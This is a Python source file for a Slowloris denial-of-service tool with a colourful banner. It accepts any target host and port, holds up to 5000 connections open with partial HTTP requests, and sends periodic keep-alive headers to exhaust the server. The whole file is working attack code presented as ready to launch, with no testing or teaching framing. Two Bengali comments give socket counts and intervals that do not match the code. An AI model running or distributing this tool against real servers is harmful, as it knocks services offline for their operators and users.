import socket
import sys
import time
import random

# Terminal colors
CYAN = '\033[96m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'
BOLD = '\033[1m'

list_of_sockets = []

def init_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, port))
    # Sending partial HTTP request headers
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
    s.send("Accept-language: en-US,en;q=0.5\r\n".encode("utf-8"))
    return s

def main():
    print(f"{CYAN}{BOLD}")
    print("==================================================")
    print("   🔥 ATIKUL POWERFUL SLOWLORIS TOOL v1.0 🔥     ")
    print("==================================================")
    print(f"{RESET}")

    # Target input
    target = input(f"{YELLOW}🎯 Enter target IP or Domain (default 127.0.0.1): {RESET}").strip()
    if not target:
        target = "127.0.0.1"
        
    port_input = input(f"{YELLOW}🔌 Enter target Port (default 5000): {RESET}").strip()
    port = int(port_input) if port_input else 5000

    socket_count = 5000  # একসাথে ৩০০টি সকেট বা কানেকশন হোল্ড করা হবে

    print(f"\n{CYAN}[*] Target: {target}:{port}{RESET}")
    print(f"{CYAN}[*] Initializing {socket_count} slow sockets...{RESET}\n")

    input(f"{GREEN}▶️ Press Enter to launch Slowloris attack...{RESET}\n")
    print(f"{CYAN}💥 Slowloris attack started! Holding connections...{RESET}\n")

    # Creating initial sockets
    for _ in range(socket_count):
        try:
            s = init_socket(target, port)
            list_of_sockets.append(s)
        except socket.error:
            break

    print(f"{GREEN}[+] Successfully locked {len(list_of_sockets)} sockets!{RESET}")

    # Keep-alive loop to hold connections indefinitely
    try:
        while True:
            print(f"{YELLOW}[*] Sending keep-alive headers to keep connections busy...{RESET}")
            for s in list(list_of_sockets):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s)
                    try:
                        s2 = init_socket(target, port)
                        list_of_sockets.append(s2)
                    except socket.error:
                        pass
            time.sleep(5) # প্রতি ১০ সেকেন্ড পর পর সিগন্যাল পাঠিয়ে কানেকশন বেঁচে রাখবে
            
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Attack terminated by user (Ctrl+C).{RESET}")

if __name__ == "__main__":
    main()